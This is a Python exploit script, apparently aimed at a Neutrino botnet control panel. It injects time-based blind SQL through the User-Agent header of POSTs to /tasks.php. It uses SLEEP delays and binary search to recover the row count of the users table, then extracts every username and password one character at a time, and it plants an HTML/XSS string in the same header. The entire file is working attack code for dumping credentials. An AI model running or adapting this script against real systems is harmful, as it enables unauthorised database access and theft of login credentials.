import requests
import time
import sys
import random
 
wait_delay = 0.5
request_count = 0
InjectionUrl = "/tasks.php"
xss_message = "XSS or any <strong>HTML</strong> tags you like can go here :D"


def length_compare(url, field, cnt, i, op):
	global request_count

	Injection = {
		'ip': "%f" % (random.random()),
		'cmd': '','uid': '','os': '','av': '','version': '','quality': '','layer': '',
	}

	header = {
		'User-agent': "%s', (IF(LENGTH((SELECT %s FROM users ORDER BY uid LIMIT 1 OFFSET %d)) %s %d, SLEEP(%f), 0))) -- -"  % (xss_message, field, cnt, op, i, wait_delay)
	}
		
	
	ConnectUrl  = url + InjectionUrl

	request_count = request_count + 1
	start = time.time() 
	r = requests.post(ConnectUrl, data=Injection, headers=header)
	end = time.time()

	if((end - start) >= wait_delay):
		return True

def char_compare(url, field, cnt, i, pos, op):
	global request_count
	
	Injection = {
		'ip': "%f" % (random.random()),
		'cmd': '','uid': '','os': '','av': '','version': '','quality': '','layer': '',
	}
		
	header = {
		'User-agent': "%s', (IF(SUBSTRING((SELECT %s FROM users ORDER BY uid LIMIT 1 OFFSET %d), %d, 1) %s BINARY CHAR(%d), SLEEP(%f), 0))); -- -" % (xss_message, field, cnt,pos, op,i , wait_delay)
	}

	ConnectUrl  = url + InjectionUrl

	request_count = request_count + 1
	start = time.time() 
	r = requests.post(ConnectUrl, data=Injection, headers=header)
	end = time.time()
	
	if((end - start) >= wait_delay):
		return True

def count_compare(url, table, i, op):
	global request_count
	
	Injection = {
		'ip': "%f" % (random.random()),
		'cmd': '','uid': '','os': '','av': '','version': '','quality': '','layer': '',
	}
		
	header = {
		'User-agent': "%s', (SELECT IF((SELECT COUNT(*) FROM %s) %s %d, SLEEP(%f), 0))); -- -" % (xss_message, table, op, i ,wait_delay)
	}

	ConnectUrl  = url + InjectionUrl

	request_count = request_count + 1
	start = time.time() 
	r = requests.post(ConnectUrl, data=Injection, headers=header)
	end = time.time()

	if((end - start) >= wait_delay):
		return True

def brute_length(url, field, cnt):

	array = range(65)
	lower = 0
	upper = len(array)

	#If more than the set range, just return the set range
	if length_compare(url, field, cnt, array[upper-1],'>'):
		return upper

	while lower < upper:
		x = lower + (upper - lower) // 2
		val = array[x]
		if length_compare(url, field, cnt, val,'='):
			return x
		elif length_compare(url, field, cnt, val,'>'):
			if lower == x:
				break
			lower = x
		elif length_compare(url, field, cnt, val,'<'):
			upper = x
	
	return 0
	
def brute_char(url, field, position, cnt):

	sys.stdout.write(" ")
	sys.stdout.flush()

	array = range(32, 127)
	lower = 0
	upper = len(array)

	#If more than the set range, just return the set range
	if char_compare(url, field, cnt, array[upper-1], position,'>'):
		return upper

	while lower < upper:
		x = lower + (upper - lower) // 2
		val = array[x]
		sys.stdout.write("\b%c" % chr(val))
		sys.stdout.flush()
		if char_compare(url, field, cnt, val, position,'='):
			return x
		elif char_compare(url, field, cnt, val, position,'>'):
			if lower == x:
				break
			lower = x
		elif char_compare(url, field, cnt, val, position,'<'):
			upper = x
	
	return 0

def brute_count(url, table):

	array = range(50)
	lower = 0
	upper = len(array)

	#If more than the set range, just return the set range
	if count_compare(url, table, array[upper-1],'>'):
		return upper
	
	while lower < upper:
		x = lower + (upper - lower) // 2
		val = array[x]
		if count_compare(url, table, val,'='):
			return x
		elif count_compare(url, table, val,'>'):
			if lower == x:
				break
			lower = x
		elif count_compare(url, table, val,'<'):
			upper = x
	
	return 0
			
			
def brute_panel(url):
	start = time.time() 

	ucnt = brute_count(url, "users");
	print("No. of users: %d" % (ucnt))
	
	for offset in range(ucnt):
		print("\n\nUsername: ");
		ulen = brute_length(url, "username", offset);
		
		for i in range(1, ulen+1):
			brute_char(url, "username", i, offset)

		print("\nPassword: ");
		plen = brute_length(url, "password", offset);
		
		for i in range(1, plen+1):
			brute_char(url, "password", i, offset)
	
	end = time.time()
	time_taken = end - start
	
	print("\n\nNumber of requests made: %d" % (request_count))
	print("Time taken: %d seconds" % (time_taken))
	print("\nRequests per second: %d" % (request_count / time_taken))

if(len(sys.argv) >= 2):
	brute_panel(sys.argv[1])
else:
	print("usage: neutrino.py http://panelurl.com/")
